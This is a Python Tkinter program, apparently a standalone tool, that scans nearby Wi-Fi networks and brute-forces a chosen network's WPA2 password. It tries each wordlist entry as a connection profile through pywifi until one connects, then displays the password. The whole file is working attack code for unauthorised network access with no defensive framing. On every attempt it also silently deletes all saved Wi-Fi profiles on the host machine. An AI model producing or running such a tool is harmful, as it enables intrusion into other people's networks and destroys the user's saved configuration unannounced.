import tkinter as tk
from tkinter import filedialog, messagebox
import pywifi
from pywifi import PyWiFi, const, Profile
import time

class WiFiBruteForcer:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi Brute Forcer")
        self.root.geometry("400x400")

        self.wifi = PyWiFi()
        self.iface = self.wifi.interfaces()[0]

        self.selected_network = None
        self.wordlist_path = None

        self.create_widgets()

    def create_widgets(self):
        self.label = tk.Label(self.root, text="Available WiFi Networks:")
        self.label.pack(pady=10)

        self.network_listbox = tk.Listbox(self.root, width=50, height=10)
        self.network_listbox.pack(pady=10)

        self.scan_button = tk.Button(self.root, text="Scan Networks", command=self.scan_networks)
        self.scan_button.pack(pady=5)

        self.select_button = tk.Button(self.root, text="Select Network", command=self.select_network)
        self.select_button.pack(pady=5)

        self.wordlist_button = tk.Button(self.root, text="Select Wordlist", command=self.select_wordlist)
        self.wordlist_button.pack(pady=5)

        self.bruteforce_button = tk.Button(self.root, text="Start Brute Force", command=self.bruteforce, state=tk.DISABLED)
        self.bruteforce_button.pack(pady=10)

    def scan_networks(self):
        self.network_listbox.delete(0, tk.END)
        self.iface.scan()
        time.sleep(3)
        results = self.iface.scan_results()

        seen = set()
        for network in results:
            if network.ssid and network.ssid not in seen:
                seen.add(network.ssid)
                self.network_listbox.insert(tk.END, f"{network.ssid} ({network.signal})")

        if not seen:
            messagebox.showwarning("Scan Complete", "No Wi-Fi networks found.")

    def select_network(self):
        selected_index = self.network_listbox.curselection()
        if selected_index:
            self.selected_network = self.network_listbox.get(selected_index).split(" (")[0]
            self.bruteforce_button.config(state=tk.NORMAL)
            messagebox.showinfo("Network Selected", f"Selected: {self.selected_network}")
        else:
            messagebox.showerror("Error", "Please select a network.")

    def select_wordlist(self):
        self.wordlist_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if self.wordlist_path:
            messagebox.showinfo("Wordlist Loaded", f"Loaded: {self.wordlist_path}")

    def bruteforce(self):
        if not self.selected_network or not self.wordlist_path:
            messagebox.showerror("Error", "Select both network and wordlist.")
            return

        with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        for password in passwords:
            print(f"[*] Trying: {password}")

            profile = Profile()
            profile.ssid = self.selected_network
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            self.iface.remove_all_network_profiles()
            test_profile = self.iface.add_network_profile(profile)

            self.iface.connect(test_profile)
            time.sleep(5)

            status = self.iface.status()
            print(f"    [DEBUG] Status: {status}")

            if status == const.IFACE_CONNECTED:
                messagebox.showinfo("Success", f"Password Found: {password}")
                print(f"[+] Success! Password is: {password}")
                self.iface.disconnect()
                return
            else:
                self.iface.disconnect()
                time.sleep(1)

        messagebox.showinfo("Failed", "Password not found in the wordlist.")
        print("[-] Brute-force complete. No match found.")

if __name__ == "__main__":
    root = tk.Tk()
    app = WiFiBruteForcer(root)
    root.mainloop()

